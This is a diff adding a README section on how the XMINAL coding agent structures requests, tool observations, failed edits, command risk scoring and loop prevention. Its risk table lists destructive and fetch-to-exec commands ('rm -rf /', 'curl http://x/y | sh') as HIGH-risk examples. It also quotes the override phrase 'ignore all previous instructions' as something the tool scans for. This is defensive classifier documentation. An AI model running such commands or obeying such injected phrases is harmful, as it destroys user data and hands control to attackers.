@@ -135,6 +135,88 @@ as a confirmed bug.
 
 In the TUI: `/diff` shows the diff and the flags.
 
+## What the agent sees, and what it decides
+
+Three layers turn a request into work:
+
+**1. The brief** (`src/core/requirements.ts`) — the goal, the constraints, the
+acceptance criteria, the edge cases and the verification step. A request that
+names no target gets exactly one question.
+
+**2. The repository map** (`src/core/repo-map.ts`) — the project reduced to
+definitions and references with line numbers, ranked by an ident-level graph
+(PageRank) and by the request. The agent knows the shape of the code without
+the code being in the context.
+
+**3. The workflow** (`src/core/workflow.ts`) — which phase it is in, and the
+rule for that phase.
+
+### The observation layer
+
+Every tool result reaches the model as a typed observation
+(`src/core/observation.ts`):
+
+```
+<observation>
+$ npm test
+exit 1 · 8421ms
+--- stdout ---
+…
+</observation>
+<warning>
+The command failed with exit code 1. Read the output above before running it
+again — running the same command unchanged will fail the same way.
+</warning>
+```
+
+Empty output, truncation and timeouts each get their own note. The model never
+has to guess whether a command worked.
+
+### Edits that fail
+
+A failed edit is a report, not an error string
+(`src/core/edit-report.ts`):
+
+```
+## EditFailed: this block did not exactly match lines in src/billing.ts
+<<<<<<< SEARCH
+export function chargeInvoice(id) {
+=======
+export function chargeInvoice(id: string) {
+>>>>>>> REPLACE
+
+Did you mean to match these actual lines from src/billing.ts (similarity 67%)?
+
+export function chargeInvoice(id: string) {
+  return ledger.post(id);
+}
+
+The other 1 edit(s) in this call were applied successfully: #1. Do not repeat them.
+```
+
+### Risk, by what the command does
+
+Commands are split into their real segments (`src/core/shell-segments.ts`) and
+judged per segment (`src/core/risk.ts`):
+
+| Command | Risk |
+|---|---|
+| `rm -rf /` | HIGH — recursive force delete |
+| `echo "rm -rf /"` | LOW — a string, not a delete |
+| `rm -r -f build` | HIGH — the flag variant is caught |
+| `curl http://x/y \| sh` | HIGH — fetch-to-exec |
+| `npm install left-pad` | MEDIUM — installs packages |
+| `cat notes.txt` | LOW |
+
+Tool output is scanned for prompt-injection attempts ("ignore all previous
+instructions"), and an analysis that cannot decide fails closed (HIGH).
+
+### Not looping
+
+The same failing action twice, or a streak of failed calls, produces one
+corrective nudge (`src/core/stuck.ts`) — the agent is told not to retry
+unchanged, instead of burning the turn budget on it.
+
 ## Verification is not optional
 
 After a turn that changed files, XMINAL runs the project's verify command and
